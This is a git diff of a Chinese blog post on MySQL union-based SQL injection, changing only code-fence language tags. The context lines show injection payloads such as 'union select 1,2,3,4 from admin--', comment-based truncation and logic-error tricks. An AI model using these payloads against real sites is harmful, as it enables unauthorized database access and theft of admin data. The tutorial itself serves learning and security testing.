@@ -9,7 +9,7 @@ date: 2016-01-26 18:49
 
 * 注入语句的格式为：参数的使用位置为上述语句中的 XO 位置
 
-```mysql
+```
 union+select+1,2,3,XO,4,...n+from+XXOO
 ```
 
@@ -47,19 +47,19 @@ hex参数可用于任何参数外面，hex(concat(xxoo))，hex(user()),hex(datab
 
 * 注入时，猜字段爆数据，有时候会遇到在原始语句后面加一些语句例如order by,desc等等，例如
 
-```mysql
+```
 SELECT 1,2,3,4 FROM news where id=1 ORDER BY date DESC
 ```
 
 注入语句以后：
 
-```mysql
+```
 select 1,2,3,4 from news where id=1 union select 1,2,3,4 from admin order by date DESC
 ```
 
 注入都会提示错误。所以，通常注入的时候，在语句最后加一个--横杠或者/*注释符，结束后面的语句
 
-```mysql
+```
 news.php?id=1+union+select+1,2,3,4+from+admin--
 news.php?id=1+union+select+1,2,3,4+from+admin/*
 ```
@@ -68,7 +68,7 @@ news.php?id=1+union+select+1,2,3,4+from+admin/*
 
 制造逻辑错误
 
-```mysql
+```
 news.php?id=1 and 1=2
 news.php?id=-1
 ```
